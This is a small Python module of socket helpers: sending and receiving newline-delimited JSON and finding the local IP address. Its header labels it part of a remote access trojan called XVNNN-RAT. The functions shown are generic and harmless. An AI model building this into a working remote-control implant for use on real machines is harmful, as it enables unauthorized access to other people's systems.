"""
Network utilities for XVNNN-RAT
Author: Ali Zafar (alizafarbati@gmail.com)
"""

import socket
import json
import logging

logger = logging.getLogger(__name__)


def send_json(sock, data):
    """Send JSON data over socket"""
    try:
        message = json.dumps(data).encode() + b"\n"
        sock.send(message)
        return True
    except Exception as e:
        logger.error(f"Failed to send JSON: {e}")
        return False


def receive_json(sock, max_size=10485760):  # 10MB limit
    """Receive JSON data from socket with size limit to prevent DoS"""
    try:
        data = b""
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
            if len(data) > max_size:
                logger.error(
                    f"Received data exceeds maximum size limit: {len(data)} bytes"
                )
                return None
            if b"\n" in chunk:
                break

        if not data:
            return None

        # Strip trailing newline if present
        data = data.strip()
        if not data:
            return None

        return json.loads(data.decode("utf-8"))
    except json.JSONDecodeError as e:
        logger.error(f"Invalid JSON received: {e}")
        return None
    except Exception as e:
        logger.error(f"Failed to receive JSON: {e}")
        return None


def get_local_ip():
    """Get local IP address"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception as e:
        logger.error(f"Failed to get local IP: {e}")
        return "127.0.0.1"
